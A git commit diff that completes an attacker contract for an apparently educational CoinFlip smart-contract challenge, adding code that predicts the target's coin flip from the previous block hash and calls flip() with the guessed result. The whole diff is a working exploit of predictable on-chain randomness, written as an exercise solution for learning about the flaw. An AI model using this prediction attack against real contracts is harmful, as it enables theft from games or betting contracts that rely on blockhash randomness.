8a146b8808457ef89f1d30eb76752a6323527997
Abhi Gulati <abhi@indeed.com>
2022-05-14 21:57:09 -0500

    Solve CoinFlip

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -1,15 +1,34 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
+import "hardhat/console.sol";
 
 contract AttackingCoinFlip {
     address public contractAddress;
+    CoinFlip private targetContract;
+
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
+        targetContract = CoinFlip(contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        targetContract.flip(nextFlip());
+    }
+
+    function blockNumber() external view returns (uint) {
+        return block.number;
+    }
+
+    function nextFlip() public view returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        return side;
     }
 }
